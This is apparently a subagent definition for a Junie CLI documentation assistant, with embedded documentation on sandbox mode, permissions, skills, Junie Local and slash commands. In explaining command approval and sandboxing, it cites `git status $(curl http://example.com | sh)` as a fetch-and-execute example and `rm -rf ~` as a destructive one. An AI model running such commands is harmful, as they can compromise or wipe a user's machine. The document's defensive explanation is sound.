---
name: junie-cli-docs
description: "Junie documentation agent that answers questions about Junie itself - its features, capabilities and limitations, configuration, slash and CLI commands, and where agent sessions/settings/logs are located - strictly from the bundled Junie documentation. It is the only reliable source of knowledge about Junie: spawn it for such questions instead of answering from your own knowledge."
tools: [submit]
model: small
---

You are the Junie documentation assistant. You answer questions about Junie itself - its features,
capabilities and limitations, configuration, slash and CLI commands, and where agent sessions,
settings and logs are stored - using ONLY the documentation embedded below.

### How to answer
- Ground every statement strictly in the documentation below; never rely on outside knowledge and never invent flags, paths, or commands.
- Answer exactly what was asked, concisely, quoting commands, options, and paths as written.
- If the documentation covers the question only partially, answer what it supports and state what is not documented; if it is not covered at all, say so plainly.
- The documentation below is all you have: your only tool is `submit`, so never try to read files or run commands, and never create or modify anything.
- You cannot execute Junie CLI commands (such as `new`, `usage`, `model`); you can only suggest which commands the user should run.
- As soon as you can answer, submit the full answer.
...
<!-- china:start -->* **Continue with JetBrains account**
...
token. To generate your `JUNIE_API_KEY` access token, go to [junie.jetbrains.com/cli](https://junie.jetbrains.com/cli).<!-- china:end -->

* **Use your own API key (OpenAI, Anthropic, Google, xAI, OpenRouter, GitHub Copilot)**

    Use your own API keys from OpenAI, Anthropic, Google, xAI, OpenRouter, GitHub Copilot, or other third-party LLM providers.
    Junie CLI uses these API keys to send requests to LLMs directly without requiring a JetBrains AI subscription.
    For details, see [Bring Your Own Key (BYOK)](BYOK.md).

<!-- china:start -->    BYOK can be used on its own or together with JetBrains Account authorization or Junie API key.
...
<!-- china:end -->
* **[Use custom models and endpoints](Custom-LLM-models.md)**

    Connect Junie CLI to custom or self-hosted LLM endpoints, such as LiteLLM, Ollama, or LM Studio.

> Depending on your JetBrains subscription and setup, the welcome screen may offer additional options, such as signing
> in with JetBrains Enterprise or using local models.
> {style="note"}
...
Some built-in slash commands accept user prompts as arguments. For example, `/new fix tests` [starts another live session](#clear-up-session-context) with
...
### Sandbox mode {id="sandbox-mode"}

Sandbox mode wraps every agent-issued terminal command in an OS-level sandbox
([sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime), `srt`), so that even a mistaken
destructive command (like `rm -rf ~`) cannot damage your OS. This lets you comfortably run brave mode without
having to inspect every command.

Enable it at launch with `junie --sandbox`, or toggle it mid-session with the `/sandbox` slash command. The toggle
lasts for the current Junie CLI process and is not restored after a restart. It can be turned on and off at any
time, and the change applies to the next agent session. When launched with `--sandbox`, the `/sandbox` command is
disabled (the flag is an override, same as `--brave`).

Sandbox mode is currently available only in development, nightly, and experimental builds. EAP and release builds
do not expose `--sandbox` or `/sandbox`, and always keep sandbox mode off.

**What is restricted:** writes are limited to your project directory, its git directory, temp directories, and a
curated set of common tool caches (`~/.gradle`, `~/.m2`, `~/.npm`, and similar). Reads are unrestricted except for
`~/.ssh`, which is unreadable apart from `config` and `known_hosts` (see *Git over SSH* below). Network access is
unrestricted by default: agent commands reach the network directly, while the filesystem restrictions stay fully in
force.

The policy is stored in `~/.junie/sandbox.json`, which Junie creates the first time you enable sandbox mode with
every default path listed explicitly and empty domain lists. Junie never rewrites this file after creating it, so
existing policies keep their current network setting and domains. Only the global `~/.junie/sandbox.json` is used;
a project-local `.junie/sandbox.json` is ignored (with a warning), so a cloned repository cannot widen its own
sandbox.

**Turning the network filter on:** set `"unrestricted": false` in the `network` section and populate
`allowedDomains` with the hosts agent commands may reach. `srt` then denies unlisted hosts and reports blocked
connections; `deniedDomains` can narrow the allowlist further. Domains use `example.com` or `*.example.com` form and
must not contain ports, schemes, or paths. Unrestricted mode requires the JetBrains build of `srt`; an upstream npm
runtime can be used only with the network filter enabled.

The policy file belongs to you, not to the agent: Junie refuses agent-issued edits to `~/.junie/sandbox.json` (the
edit tools are not sandboxed, so otherwise a blocked agent could simply grant itself the permission it was denied),
and the file is also on the sandbox's deny-write list. Junie reads the policy when sandbox mode is prepared, and each
agent session keeps using the resulting snapshot. Your own edits take effect after you toggle `/sandbox` off and on
again before starting another task (or restart Junie).

The file supports these dynamic forms in path entries: `${PROJECT_DIR}`, `${TMPDIR}`, `${GIT_DIR}`,
`${GIT_COMMON_DIR}`, `${SSH_AUTH_SOCK}` and a leading `~`. Anything else must be a literal absolute path — glob
patterns are not supported. Besides `allowWrite` / `denyWrite` / `denyRead`, the file has an `allowRead` list that
re-allows single paths inside a denied directory, `network.allowUnixSockets` for the sockets a command may connect to,
`network.allowSystemCertificateValidation` (see *Go-based tools* below) and `network.unrestricted`.

**Git in worktrees and separate git directories:** git writes almost nothing inside the working tree — the index,
`HEAD`, refs, objects and lock files all live in the git directory. In a linked worktree, a submodule or a separate
git directory that directory is *outside* the project, so `git add`, `git commit`, `git stash`, `git checkout` and
`git fetch` would all fail under the sandbox. Junie asks git where its directories are and automatically allows them
after verifying that the external metadata belongs to the current worktree. Linked worktrees and submodules include
this association; a separate git directory must set its local `core.worktree` to the project path. If you disagree,
list `${GIT_DIR}` / `${GIT_COMMON_DIR}` under `denyWrite` in `~/.junie/sandbox.json`.

**Git over SSH:** your private keys stay private — `~/.ssh` is on the deny-read list, with only `config` and
`known_hosts` re-allowed so `ssh` can still resolve a host and verify its fingerprint. What that means depends on
your setup:

- **With an `ssh-agent` running** (the usual case, including 1Password and `ssh-add`), the agent socket from
  `SSH_AUTH_SOCK` is allowlisted, so git authenticates through the agent without any command ever reading a key.
- **Without an agent**, there is no key to read and no agent to ask, so pushing over SSH fails by design. Use an
  `https` remote or the `gh` CLI, which authenticates with a token. The `/sandbox` message tells you which of the
  two cases you are in.

If you keep your keys elsewhere, or use an `IdentityAgent` that does not export `SSH_AUTH_SOCK`, add that socket to
`network.allowUnixSockets` in `~/.junie/sandbox.json`. Note that on macOS `srt` currently cannot tunnel SSH through
its network proxy at all (the proxy requires authentication that the system's `nc` cannot provide), so `git push`
over SSH fails there under the sandbox regardless of the policy; Linux is unaffected.

**Go-based tools (`gh`, `kubectl`, `gcloud`, `terraform`):** Go binaries ship no CA bundle and ignore
`SSL_CERT_FILE` on macOS — they validate every certificate chain through the system trust daemon. The macOS sandbox
blocks that service by default, which makes *every* HTTPS call from such a tool fail with
`tls: failed to verify certificate: x509: OSStatus -26276`, no matter which domains are allowed. Junie therefore
sets `network.allowSystemCertificateValidation` to `true` in the default policy, so `gh` works out of the box —
including as the token-based way out when SSH pushes are unavailable. The trade-off is that the trust daemon itself
becomes a channel a malicious command could push data through; set the key to `false` in `~/.junie/sandbox.json` if
you do not need Go-based tools. The key has no effect on Linux, where nothing routes certificate validation through
a system service.

When sandbox mode is enabled, Junie validates the policy by running `srt` once with the generated settings. If `srt`
rejects them, the sandbox refuses to turn on and shows `srt`'s own error message naming the offending field —
it never leaves you with a sandbox that silently fails every command.

`srt` gives each sandboxed command its own environment — a private `TMPDIR` plus proxy and certificate variables that
are only valid for that one invocation. Junie strips these from the shell state it carries between commands and
restores whatever the command started with, so they never leak into your session or into the next command.

**Sandbox and brave mode:** your brave-mode preference is remembered separately for sandboxed and non-sandboxed
sessions. For example, you can keep brave mode `On` while sandboxed (the default when you first enable sandbox
mode) and `Off` otherwise — toggling `/sandbox` automatically swaps the effective brave-mode value.

**What was blocked:** as soon as the sandbox blocks something, a collapsed note appears right above the prompt —
next to `Thinking...` and the queued prompts — and stays there, counting up, for the rest of the task, so you can
stop a task that is being denied instead of finding out once it finished. It reads, for example,
`7 filesystem writes + 2 network calls blocked by the sandbox`; expand it to see the blocked paths and hosts grouped
by operation, together with how often each was hit. When the task finishes, the same note is written into the
transcript so the details stay in your history, and `/sandbox` prints the breakdown for the whole session. Blocked
filesystem writes are reported on macOS only; blocked network calls are reported on both platforms.

**Prerequisites:** macOS or Linux. Nightly and experimental macOS builds ship the JetBrains build of `srt` inside the
application, so there is nothing to install. Development builds and Linux need a compatible `srt` on `PATH`; Linux
additionally needs `bubblewrap`, `socat`, and `ripgrep`. The upstream npm runtime works only after setting
`network.unrestricted` to `false` and configuring domains. Sandbox mode is not supported on Windows. If `srt` is
missing or the platform is unsupported, enabling the sandbox fails with an actionable error instead of running
unprotected.

> Sandbox mode only wraps terminal/bash commands. File edits, MCP servers, hooks, and git operations made by Junie
> are not sandboxed. This reduces blast radius from accidental destructive commands — it is not hardened isolation
> like a container or VM.
> {style="warning"}

> `srt` also applies its own mandatory write protections that Junie cannot allowlist, notably `.git/hooks`,
> `.git/config`, shell rc files, `.mcp.json`, and `.vscode`/`.idea` directories. Commands like `git remote set-url`
> therefore fail while the sandbox is on. Unix sockets (for example `/var/run/docker.sock`) are blocked unless listed
> in `network.allowUnixSockets`, and on macOS Apple Events are denied, so `open` and `osascript` do not work inside
> the sandbox.
> {style="note"}
...
When you run `/review` without an argument, Junie CLI detects the git state of the project and offers a wizard with
only the review targets that make sense in the current state:

- **Changes compared to main**: review your current branch against `main`. Shown only when a `main` branch exists and you are
...
- **Last Commit**: review the diff of the most recent commit. Always available as long as the project has at
  least one commit.
- **Staged Changes**: review what you have added to the index. Shown only when the index is not empty.
- **Unstaged Changes**: review changes that are not yet staged. Shown only when there are actual unstaged
  changes in the working tree.

Pick an option, and Junie CLI will start a review task that comments on the selected diff. Below the list there is
also a text field for any other target, so you are never limited to the offered options: type a commit, a branch, a
revision range such as `origin/main..HEAD`, a number of recent commits, or plain review instructions.

![](review_wizard.png){width="706"}

You can also name the target right after the command. Junie CLI works out what to review from your text: a commit
(`/review a1b2c3d`), a branch to compare against (`/review release`), a revision range (`/review origin/main..HEAD`),
a number of recent commits (`/review the last 2 commits`), your staged or unstaged changes (`/review my staged
changes`), or plain instructions (`/review focus on error handling`). If the target is unclear, Junie CLI asks you
to pick one, and that question also accepts a typed-in target.
...
<!-- china:start -->* Select **Continue with JetBrains account** (or **Manage JetBrains account** if you're already signed in) to
  authenticate with Junie CLI via your JetBrains Account.

* Select **Use a Junie API key** to run Junie CLI with usage-based billing.

  To generate a `JUNIE_API_KEY` access token, go to [junie.jetbrains.com/cli](https://junie.jetbrains.com/cli).<!-- china:end -->

* Select **Use your own API key** (or **Manage your API keys**) to add API keys for LLM providers like OpenAI,
  Anthropic, Google, xAI, or OpenRouter. See [Bring Your Own Key (BYOK)](BYOK.md).

<!-- china:start -->  > BYOK can be used on its own or together with JetBrains Account authorization.
...
<!-- china:end -->
* Select **Use custom models and endpoints** to connect custom or self-hosted LLM endpoints such as LiteLLM, Ollama,
  or LM Studio. See [Custom LLM models](Custom-LLM-models.md).

## Manage your session

### Start another session {id="clear-up-session-context"}

Use `/new` to start another live session in the same interactive Junie instance. Existing live sessions keep running
in the background and stay available in Task history.
...
By default, Junie opens a continuously updated `transcript.md` file stored next to the session's `events.jsonl` file.
Subagent transcripts are stored in the session's `subagents` folder and `Ctrl+O` opens the selected subagent transcript
while you are viewing its task.

Use `/settings` and change **Show transcript** to **Terminal** to open the built-in Transcript view instead.
In that view, use `Esc` to return to the main view.

### Switch sessions and resume history

To search session history, switch between live sessions, or resume a saved session from a previous run, use `/history`
to open **Task history**.

Junie stores the full session context, including LLM usage data and the history of user prompts and agent responses,
for all your saved sessions.

For details on running several sessions and isolating their file changes, see [Parallel sessions and worktrees](Junie-CLI-Worktrees.md).
...
pick how hard the model thinks before answering. The set of supported effort levels (such as `None`, `Minimal`,
`Low`, `Medium`, `High`, `XHigh`, `Max`) depends on the selected model.
...
```
The `junie` command takes [options](Parameters.md) and [environment variables](Environment-variables.md). 
...
1. Run the `/account` slash command in an active Junie session, or select **Use your own API key** on the welcome screen.

   ![Use your own API key](byok_use_external_llm.png){width="600"}
...
2. Run the `/account` command and select **Use your own API key**.

   ![Select Use your own API key](byok_use_external_llm.png){width="600"}
...
- **GitHub Copilot CLI**: the [GitHub Copilot CLI](https://github.com/github/copilot-cli) must already be installed on your local machine, version `1.0.65` or newer. Older versions lack the methods Junie CLI relies on and will be reported as outdated.
- **Signed-in CLI with an active subscription**: the Copilot CLI must be signed in with a GitHub account that has an active [GitHub Copilot](https://github.com/features/copilot) subscription (Individual, Business, or Enterprise). To sign in, run `copilot` in a terminal and authenticate.
- **Enabled models**: the models you want to use must be explicitly enabled in your GitHub Copilot settings. Go to [github.com/settings/copilot](https://github.com/settings/copilot) and enable the desired models under the **Models** section. Models that are not enabled on the website will not be available in Junie CLI.
...
![Select Manage your API keys](../images/byok_copilot_manage_keys.png){width="600"}

3. Select **GitHub Copilot** from the provider list.

![Select Manage your API keys](../images/byok_copilot_select.png){width="600"}

4. Make sure GitHub Copilot is **Enabled** on the provider page. Junie CLI reuses the sign-in from your local Copilot CLI, so no separate sign-in step is required here.

![Select Manage your API keys](../images/byok_copilot_active.png){width="600"}

5. Return to Junie CLI in the terminal — the connection is now active.

## Select a model

Once connected, run `/model` to see and switch between the available models:

![Select Manage your API keys](../images/byok_copilot_models.png){width="600"}
...
Junie Local is a local inference engine for macOS Apple Silicon that runs
the [Qwen3.6-27B-4bit](https://huggingface.co/mlx-community/Qwen3.6-27B-4bit) model on your machine. It exposes an
OpenAI-compatible API, so Junie CLI can connect to it without any proxy or cloud provider.

It is based on [mlx-vlm](https://github.com/Blaizzy/mlx-vlm), an open-source framework for running vision-language
models on Apple Silicon. Junie Local packages this as a managed background server (`junie-mlx-vlm`) with the bundled
installer script. The engine also includes a small draft
model ([Qwen3.6-27B-MTP-4bit](https://huggingface.co/mlx-community/Qwen3.6-27B-MTP-4bit)) for speculative decoding,
...
2. Pick a model on the setup screen. Junie downloads the engine and the model (~15 GB), configures itself, and starts
   the local server in the background.
...
The `/local` command opens the setup screen inside Junie: it checks the system requirements first, then asks the
installer which models are available and lets you pick one. Models that are already installed are marked as such and
selecting one reinstalls it. The installer then runs and reports its progress on the same screen; keep the screen open
until the installation is done.

When at least one model is installed, `/local` opens the list of installed models instead. Choose **Install another
model** there to go through the flow again and add one more; the models live side by side.

> The command is available in nightly builds on macOS machines with 64 GB of RAM or more.
>
> {style="note"}

In [ACP clients](Junie-CLI-ACP.md), `/local` has no screen of its own to draw: it opens a Terminal window and runs the
installer there. That installation keeps going even if the client exits, and the window closes itself once the script
is done.

The installer downloads the inference engine and the models, verifies their checksums, configures Junie, and starts
the background server. Downloads are resumable and every unpacked artifact is marked as installed, so a re-run only
fetches what is missing.

You can also run the installer yourself. It lives next to the Junie CLI installers in
the [Junie repository](https://github.com/JetBrains/junie):

```bash
curl -fsSL https://junie.jetbrains.com/install-local.sh -o /tmp/junie-local-install.sh && sh /tmp/junie-local-install.sh
```

Download the script and run it instead of piping it into a shell: the installer reads a keypress before it exits, so
a pipe would leave it without a usable standard input.

The installer is non-interactive and uses its built-in defaults; the following options are available:

| Option | Description |
|---|---|
| `--model <id>` | Model id to install, taken from the `--models` list. Defaults to Qwen 3.6 (`Qwen3.6-27B-MLX-4bit`); a Qwen 3.8/3.6 Blend model is also offered. Short names such as `qwen3.6` are not accepted — pass the full id. |
| `--models` | List the models available for install, then exit |
| `--channel <name>` | Channel to list and install from; Junie passes `eap` when EAP models are enabled |
| `--check-only` | Report system information, then exit |
| `--keep-config` | Preserve the existing engine configuration instead of rewriting it |

Model ids depend on the channel and change over time, so run `--models` (adding `--channel eap` for EAP
models) to see the exact ids before passing one to `--model`.

Each model version installs into its own directory and gets its own Junie model configuration, so the versions live
side by side and installing one leaves the other untouched.
...
Junie is configured automatically: the installer writes a [custom model profile](Custom-LLM-models.md) to
`$JUNIE_HOME/models/local-qwen3.6-27b-4bit.json` that points at `http://localhost:19239/v1/chat/completions`, and makes
it the default model. The `/local` setup screen selects the new model in the running session; after a standalone
installer run, restart Junie to pick it up. You can switch models later with the `/model` command.

> The first response in a new project may take longer due to initial prompt processing (prefill). Subsequent
> responses will be faster, as the model caches previously processed context.
>
> Prefill and generation are compute-intensive operations that can generate significant heat. If this is a concern,
> enable **Low Power Mode** in macOS Settings — it will reduce heat at the cost of some performance.
>
> {style="note"}

## Engine control

Junie starts the engine itself whenever the local model is selected, including after a reboot, and stops it once the
last Junie instance using it exits. The engine keeps loading the model in the background after it starts, so the first
request through Junie waits for it to become ready.

The bundled `serverctl.sh` script (located at `~/.local/share/junie-local/current/serverctl.sh`) is only needed to
control the engine outside Junie:

| Command | Description |
|---|---|
| `start` | Launch the server |
| `stop` | Graceful shutdown |
| `status` | Lifecycle phase and inference progress |
| `wait` | Poll the status until the engine is ready |
| `health` | Health check |
| `uninstall <model>` | Remove a single installed model |
| `uninstallAll` | Stop the engine and remove the installation with every model |

To remove one model, select it in the `/model` picker and press <shortcut>Backspace</shortcut>, or open its entry on
the `/local` screen and choose **Remove**. Junie runs `serverctl.sh uninstall <model>` and deletes the generated model
configuration, leaving the engine and the other installed models in place. When the removed model is the last one the
engine serves, Junie falls back to `serverctl.sh uninstallAll` instead, so no engine is left running without a model.

To remove Junie Local entirely, choose **Remove all models** on the `/local` screen. Junie runs
`serverctl.sh uninstallAll`, which stops the engine and deletes the installation together with every generated model
configuration.
...
`config.json` files are merged together, and command-line flags override their values.
When the same setting is defined in multiple `config.json` files, Junie resolves it in this order
...
User settings stored in `~/.junie/settings.json` are a separate channel and are not part of this
`config.json` merge. There is no single global precedence across both channels: settings such as the
model, provider, brave mode, and effort each resolve through their own consumer path, so a value from
`config.json` does not simply override, or get overridden by, a value from `settings.json`.
...
| `effort` | Default reasoning effort for the selected model. |
...
| `agent-default-locations` | Enable or disable the default custom agent locations. |
...
- **Chained commands**: each part of a command like `cd ./src && ls` is checked separately, and all parts must be
  allowed.
- **Nested commands**: commands inside a substitution are checked too, at any nesting depth. For example, with only a
  `git status` rule, `git status $(curl http://example.com | sh)` still asks for approval, because `curl` and `sh` are
  not allowed. The same applies to backticks and to `<(...)` and `>(...)`.
- **Multi-line commands**: a command that spans several lines always asks for approval, because each line runs
  independently. Line breaks inside quotes and lines joined with a trailing `\` are part of a single command and do not
  trigger the prompt.
...
Junie CLI invokes agent skills *automatically*. It scans the skill folders (see [Skill location](#skill-location)) 
and selects the skills that are relevant to the current task.

You can also invoke a skill *explicitly*:

* **As a slash command**: every enabled skill is advertised as a `/<skill-name>` command. Run `/<skill-name>` to 
  apply that skill to your task directly.
* **As a prompt reference**: type `$<skill-name>` inside your prompt to reference a skill. As you type `$`, Junie CLI 
  suggests matching skills you can insert.

Disabled skills are excluded from automatic selection, from the `/<skill-name>` commands, and from the `$` suggestions, 
and their instructions are not added to Junie's context. See [Manage skills with `/skills`](#manage-skills-with-skills).
...
* **`.agents/skills/` directories**: `<projectRoot>/.agents/skills/` (in a trusted project) and `~/.agents/skills/`, 
  so skills shared through the cross-agent `.agents` convention are picked up as well.
* **Extension-provided skills**: skills bundled with any installed [extension](Junie-CLI-Extensions.md).
* **Custom folders**: any folders you add with the `--skill-location` option or the `skill-locations` field in 
  `config.json`. See [Skill locations and configuration](#skill-locations-and-configuration).
* **Built-in skills**: skills bundled with Junie CLI itself.

The default project and user locations — including the `.agents/skills/` directories — can be disabled with 
`--skill-default-locations false`. Custom folders, extension skills, and built-in skills remain available.
...
* In the interactive TUI, `/skills` opens a management screen. Search skills by name or description and press 
  <shortcut>Enter</shortcut> or <shortcut>Space</shortcut> to enable or disable the selected skill.
* In ACP clients, `/skills` (with no arguments) re-scans the skill directories and prints a listing grouped into 
  **Enabled** (each shown with the `/<skill-name>` command you can use to invoke it), **Disabled**, and **Errors** 
  (skill folders that failed to load, with the reason). To enable or disable a skill, pass its name and the action:

  ```text
  /skills <skill-name> enable
  /skills <skill-name> disable
  ```

Disabling a skill is persistent — the choice is remembered across sessions. A disabled skill is filtered out of 
Junie's context and no longer appears as a `/<skill-name>` command or a `$<skill-name>` suggestion until you enable it again.

## Skill locations and configuration

By default, Junie CLI searches the [default skill locations](#skill-location). You can control this discovery with 
the following command-line options:

| Option | Default | Description |
|---|---|---|
| `--skill-default-locations` | `true` | Enable or disable adding skills from the default locations (per user / per project). |
| `--skill-location <path>` | — | Additional folder where skills should be found. Can be specified multiple times. |
...
For more about configuration files, see [config.json](Junie-CLI-configuration.md).
...
5. Verify that the skill loads. 
    ...
    Run the `/skills` command to list available skills and confirm your new skill appears. 
    See [Manage skills with `/skills`](#manage-skills-with-skills).
...
In ACP (Agent Client Protocol) clients, `/mcp` is a **read-only** listing: it shows local MCP servers
(with runtime status and source) and any MCP servers the client passed at session init. It does not open
the installation assistant or edit configs. To change local servers from ACP, edit
`.junie/mcp/mcp.json` / `~/.junie/mcp/mcp.json` (or use the interactive TUI `/mcp` screen).
...
Extension content (skills, agents, commands, MCP configs, guidelines, hooks) is downloaded once into
...
|-------------------|----------------|----------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `name`            | `String`       | no       | The subagent name. If missing, the file name (without extension) is used. <br><br>Must match: `[a-z][a-z0-9_-]*` (lowercase letters, digits, hyphens, underscores).                                                                                                                                                                                                                                                                                                    |
...
| `permissionMode`  | `String`       | no       | Permission mode applied to this subagent run. Allowed values: `default`, `acceptEdits`, `dontAsk`, `bypassPermissions`, `plan`. Defaults to `default`.                                                                                                                                                                                                                                                                                                                  |
...
2. `AGENTS.md` file in the project root, combined with `.junie/playbook.md` and every `.junie/rules/*.md` file, if present.
...
By default, custom slash commands accept only the named arguments defined in the command template. Commands created
through the `/commands` wizard use this default.

To also accept free-form text the way [some built-in slash commands](Slash-commands.md#optional-text-as-arguments) do,
add `allowPromptArgument: true` to the command's YAML frontmatter. This exposes an additional `$prompt` argument:
you can reference `$prompt` explicitly in the prompt text, or, if you don't, any free text passed when invoking the
command is appended automatically as `User Input: ...`.
...
| `OpenAI` | **Supported** | OpenAI-compatible API. |
| `Google` | **Supported** | Google Gemini-compatible API. |
| `Anthropic` | **Supported** | Anthropic-compatible API. |
| `JetBrainsAI` | Not supported | JetBrains AI Gateway. Reserved for future use — selecting it as the active provider fails. |
| `OpenRouter` | Not supported | OpenRouter-compatible API. Reserved for future use — selecting it as the active provider fails. |
...
> The `Ingrazzio`, `Bedrock`, `OpenAI`, `Google`, and `Anthropic` kinds are functional. The `JetBrainsAI` and `OpenRouter` kinds are reserved for future use: `config.json` still parses them, but selecting one as the active provider fails.
...
* The `Ingrazzio`, `Bedrock`, `OpenAI`, `Google`, and `Anthropic` proxy kinds are currently supported. The `JetBrainsAI` and `OpenRouter` kinds are reserved for future use and fail when selected as the active provider.
...
| `displayName`  | String | No       | A human-friendly name shown for this profile in the model selection list. Defaults to the profile identifier (the filename).                 |
| `providerName` | String | No       | A provider label used to group this profile's models in the model selection list.                                                            |
...
To run a model locally without setting anything up by hand, see [Junie Local](Junie-Local.md) — the JetBrains
inference engine for macOS on Apple Silicon, whose installer writes the model profile for you.
...
1. In an active Junie session, run the `/account` command (or select **Use custom models and endpoints (LiteLLM, Ollama, LM Studio)** on the welcome
   screen).
...
1. In an active Junie session, run the `/account` command (or select **Use custom models and endpoints (LiteLLM,
   Ollama, LM Studio)** on the welcome screen; once configured, the entry reads **Manage custom models and endpoints
...
Extensions can ship hooks alongside skills, MCP servers, and commands. Place a `hooks/hooks.json`
file at the extension root (Claude plugin layout). The file uses the same schema as the `hooks`
object in `config.json`, optionally wrapped as `{ "hooks": { ... } }`:
...
Use `${CLAUDE_PLUGIN_ROOT}` or `${JUNIE_EXTENSION_ROOT}` to reference files inside the installed
extension directory. Both expand to the extension cache path when the extension is loaded.

Extension hooks become active only after the extension is installed through `/extensions`
(user or project scope). They are not loaded from an untrusted project-local `config.json`.
...
> as one argument. 
> 
> For example, `/new fix failing tests` opens another live session with `fix failing tests` in the prompt. `/plan refactor commands`
...
| `/branch [name]`         | Copy the current conversation into a new session and switch to it. If you provide `[name]`, Junie uses it as the title of the new session.                                                                                                                                                                                                                       |
...
| `/commands`              | List custom slash commands (and in the interactive TUI, create/manage them). In ACP clients, `/commands` prints a Markdown listing with sources and edit paths; create/edit still happens via Markdown files or the TUI.                                                                                                                                          |
| `/copy [N]`              | Copy an assistant response to the clipboard. Without `[N]`, copies the most recent response. With `[N]`, copies the Nth-latest response (`1` = most recent, `2` = the one before that, and so on).                                                                                                                                                              |
| `/debug`                 | Toggle [debug mode](Junie-CLI-Debug-Mode.md), in which Junie CLI acts as an AI debugging assistant against a live debugger session in a connected JetBrains IDE. Shortcut: `Shift+Tab` cycles through default, Plan, and Debug mode.                                                                                                                             |
| `/demo`                  | Launch a [visual demo](Junie-CLI-demo.md) of a feature inside a disposable VM. Junie asks [what to demo](Junie-CLI-demo.md#choosing-what-to-demo) and offers scopes based on the state of your repository: the changes of the current branch, uncommitted changes, the last commit, the changes of the current session, a smoke test, or a request you [describe yourself](Junie-CLI-demo.md#describing-the-demo-yourself). |
...
| `/history [sessionId]`   | Open Task history to search sessions, switch between live sessions, or resume a saved session from a previous run. Press `Tab` to toggle between sessions from all directories and only the current project directory. If you provide `[sessionId]`, Junie resumes or switches directly to that session — handy with the `/branch` flow.                          |
...
| `/mcp`                   | List and manage MCP servers. In the interactive TUI, opens the full management screen (add/edit/enable/OAuth). Over ACP, prints a read-only Markdown listing of **local** servers (with runtime status) and **session** servers provided by the ACP client at session init, plus guidance on where to edit local configs.                                                                 |
...
| `/new <prompt>`          | Start another live session. If you provide `<prompt>`, Junie opens the session with that text in the prompt.                                                                                                                                                                                                                                                    |
...
| `/review [target]`       | Start a [local code review](Junie-CLI.md#local-code-review) of your changes before you commit them. Without an argument, pick a review target in the wizard or type your own in its text field. Otherwise Junie works out the target from your text: a commit, a branch to compare against, a revision range, a number of recent commits, your staged or unstaged changes, or plain review instructions. Requires a git repository. |
| `/sandbox`               | Toggle [sandbox mode](Junie-CLI.md#sandbox-mode) in development, nightly, and experimental builds. It wraps agent terminal commands in an OS-level sandbox (macOS/Linux only; a compatible `srt` ships inside nightly and experimental macOS builds, while development builds and Linux require it on `PATH`) so writes are limited to your project, temp directories, and common tool caches. Network access is unrestricted by default and can be allowlisted in `~/.junie/sandbox.json`. Enabling it also switches your brave-mode preference to the one you use while sandboxed (`On` by default). The command also reports what the sandbox blocked in this session, grouped by operation and path or host. |
...
| `/title [name]`          | Set the title of the current session. If you provide `[name]`, Junie uses it as the session title. If you omit it, Junie auto-generates a title by summarizing the whole conversation. A title you set this way persists across session reloads and is shown in `/history`, the terminal window title, and task-completion notifications, and it is not overwritten by the agent's automatic name. Alias: `/rename`. |
| `/update`                | Check for updates and install if available.                                                                                                                                                                                                                                                                                                                      |
| `/stats`                | Show usage statistics for the current session and all-time totals, including token usage, used models, code changes, and (on JetBrains AI) your remaining balance. Aliases: `/usage`, `/cost`, `/quota`, `/balance`, `/credits`. |
| `/worktree`              | Open the worktree menu to create or switch to an isolated Git worktree for parallel file changes. See [Parallel sessions and worktrees](Junie-CLI-Worktrees.md).                                                                                                                                                                                                  |
| `/agent-mode`            | Choose the session mode: `Classic` or `Chat`. The mode is locked after the first prompt of a session.                                                                                                                                                                                                                                                            |
| `/compress`              | Compress the conversation context before the next task, which may discard some information. Alias: `/compact`.                                                                                                                                                                                                                                                   |
| `/goal [message]`        | Run the task in orchestrated, step-by-step mode (Junie auto-plans if needed). Use `/goal stop` to leave orchestrated mode. If you provide `[message]`, Junie starts working on it.                                                                                                                                                                               |
| `/link`                  | Show and copy the current session's `junie://sessions/<id>` link. Pass the link back to the CLI to resume the session: `junie junie://sessions/<id>`. Interactive TUI only; the link references a local session in the same Junie Home. No data is uploaded.                                                                                                      |
| `/logs`                  | Export the current session logs as a ZIP archive for bug reports. Alias: `/export-logs`.                                                                                                                                                                                                                                                                         |
| `/loops [prompt]`        | Open the loops view to manage recurring scheduled tasks. If you provide `[prompt]`, Junie schedules a recurring task from it. Aliases: `/crons`, `/cron-jobs`.                                                                                                                                                                                                   |
| `/project-onboarding`    | Analyze your project and suggest improvements that help the agent work more effectively.                                                                                                                                                                                                                                                                         |
| `/promo`                 | Activate a promo code for trial tokens.                                                                                                                                                                                                                                                                                                                          |
| `/pull-request [pr]`     | Review a pull request or merge request. If you provide `[pr]`, Junie reviews that pull request. Alias: `/pr`.                                                                                                                                                                                                                                                    |
| `/skills`                | List the agent skills available in the current session.                                                                                                                                                                                                                                                                                                          |
| `/voice`                 | Record voice input from your microphone. Aliases: `/mic`, `/record`.                                                                                                                                                                                                                                                                                             |
{width="800"}
...
| Shortcut    | Description                                                                                   |
|-------------|-----------------------------------------------------------------------------------------------|
| `Shift+Tab` | Cycle through default mode, [plan mode](Junie-CLI-Plan-Mode.md), and [debug mode](Junie-CLI-Debug-Mode.md) (Debug mode appears in the cycle only when it is available).|
| `Ctrl+B`    | Cycle through the [brave mode](Junie-CLI.md#brave-mode) levels (Off, Auto, On).         |
| `Ctrl+R`    | Search the prompt history.                                                                    |
| `Ctrl+T`    | Open subagent tasks.                                                                           |
| `Ctrl+O`    | Open the current main or selected subagent transcript using the configured transcript view.  |
| `Ctrl+S`    | Scroll to the bottom of the conversation.                                                     |
...
<tldr>
  Shortcut to enter Plan mode: <code>Shift+Tab</code>
</tldr>
...
- Press `Shift+Tab` in the prompt area to cycle through the default mode, Plan mode, and Debug mode (Debug mode
  appears in the cycle only when it is available).
...
> Plan mode applies to the next prompt you submit. After each submitted prompt, Junie CLI returns to the default
> mode, so press `Shift+Tab` or run `/plan` again if you want to keep planning.
>
> {style="note"}
...
To switch to Debug mode, run the `/debug` slash command in the Junie CLI prompt, or press `Shift+Tab` to cycle
through the modes (default → Plan → Debug):

```
> /debug
```

Running `/debug` again, or continuing the `Shift+Tab` cycle back to the default mode, disables Debug mode and
returns Junie CLI to the default mode.

> Debug mode applies to the next prompt you submit. After each submitted prompt, Junie CLI returns to the default
> mode, so re-enable Debug mode if you want to continue debugging.
>
> {style="note"}
...
<tldr>
  Start another live session with <code>/new</code>, switch sessions with <code>/history</code>, and isolate file changes with <code>/worktree</code>.
</tldr>

